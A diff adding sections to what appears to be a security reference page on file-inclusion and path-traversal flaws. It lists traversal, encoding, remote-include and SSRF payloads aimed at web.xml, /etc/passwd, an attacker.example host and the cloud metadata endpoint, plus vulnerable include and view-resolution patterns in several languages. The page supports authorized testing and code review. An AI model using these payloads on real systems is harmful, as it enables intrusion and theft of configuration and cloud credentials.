@@ -30,6 +30,109 @@ The unsafe assumption is that users only request legitimate page names. Attacker
 | **Weak controls** | Prefix-only checks, string concat `"pages/" + name + ".jsp"`, no canonicalization |
 | **Cross-framework equivalents** | Flask `render_template(user_path)`, Go `template.ParseFiles(name)`, Razor partial paths |
 
+## Attack Payloads
+
+Use these in authorized tests when a parameter selects which page or fragment is included. Replace `PARAM` with the vulnerable query or form field name.
+
+### Pattern 1: Directory traversal via include path
+
+```text
+PARAM=../../../WEB-INF/web.xml
+PARAM=....//....//etc/passwd
+PARAM=..%2f..%2f..%2fWEB-INF%2fweb.xml
+```
+
+### Pattern 2: Absolute path under web root
+
+```text
+PARAM=/admin/dashboard.jsp
+PARAM=/WEB-INF/applicationContext.xml
+PARAM=/META-INF/context.xml
+```
+
+### Pattern 3: Alternate extension and backup files
+
+```text
+PARAM=login.jsp.bak
+PARAM=config.properties
+PARAM=../../application.yml
+```
+
+### Pattern 4: Null byte and encoding tricks (legacy parsers)
+
+```text
+PARAM=footer.jsp%00
+PARAM=..%252f..%252fadmin%252fsecret
+PARAM=..%c0%af..%c0%afetc/passwd
+```
+
+### Pattern 5: Remote / SSRF-style include (when url= is supported)
+
+```text
+PARAM=https://attacker.example/evil.jsp
+url=file:///etc/passwd
+url=http://169.254.169.254/latest/meta-data/
+```
+
+### Pattern 6: Framework view-name injection
+
+```text
+PARAM=redirect:/admin/users
+PARAM=..\\..\\windows\\win.ini
+view=error/../secret
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for include directives and dynamic view resolution. Any path built from request parameters without an allowlist is a review priority.
+
+### Java (JSP / JSTL)
+
+```jsp
+<jsp:include page="${param.page}"/>
+<c:import url="${param.fragment}"/>
+<%@ include file="<%= request.getParameter("tpl") %>" %>
+RequestDispatcher rd = req.getRequestDispatcher(userPage); rd.include(req, resp);
+```
+
+### Java (Spring MVC)
+
+```java
+return userViewName;  // from request parameter
+ModelAndView mv = new ModelAndView(request.getParameter("view"));
+return "redirect:" + userPath;
+```
+
+### Python (Flask / Jinja2)
+
+```python
+return render_template(f"partials/{fragment}.html")
+return render_template(request.args.get("page"))
+app.jinja_env.get_template(user_path).render()
+```
+
+### C# (ASP.NET / Razor)
+
+```csharp
+return PartialView(userSelectedPartial);
+@Html.Partial(Model.FragmentName)
+@await Html.PartialAsync(Request.Query["view"])
+```
+
+### JavaScript (server-side rendering)
+
+```javascript
+res.render(req.query.template, data);
+ejs.renderFile(`views/${req.params.page}.ejs`, data);
+```
+
+### Go
+
+```go
+tmpl := template.Must(template.ParseFiles("templates/" + r.URL.Query().Get("page")))
+http.ServeFile(w, r, filepath.Join("views", userFragment))
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
